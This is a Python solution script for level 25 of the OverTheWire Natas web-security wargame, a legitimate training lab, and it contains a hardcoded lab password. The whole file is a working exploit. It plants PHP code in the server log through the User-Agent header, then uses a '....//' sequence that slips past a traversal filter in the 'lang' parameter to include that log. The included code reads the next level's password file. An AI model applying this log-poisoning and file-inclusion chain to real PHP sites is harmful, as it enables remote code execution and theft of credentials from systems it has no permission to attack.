import requests
import re

username = "natas25"
passsowrd = "O9QD9DZBDq1YpswiTM5oqMDaOtuZtAcx"
url = "http://%s.natas.labs.overthewire.org/"%username

session = requests.Session()
response = session.get(url,auth=(username,passsowrd))

# .. ../ / -> ....//
headers = { "User-Agent" : "<?php echo file_get_contents('/etc/natas_webpass/natas26'); ?>" } 


log_file = "....//....//....//....//....//var/www/natas/natas25/logs/natas25_%s.log"%session.cookies['PHPSESSID']
response = session.post(url,headers=headers,data={"lang": log_file },auth=(username,passsowrd))
content = response.text
flag = re.findall('] (.*)\n "Directory traversal attempt! fixing request."',content)[0]
print("[+] Gotcha ", flag)
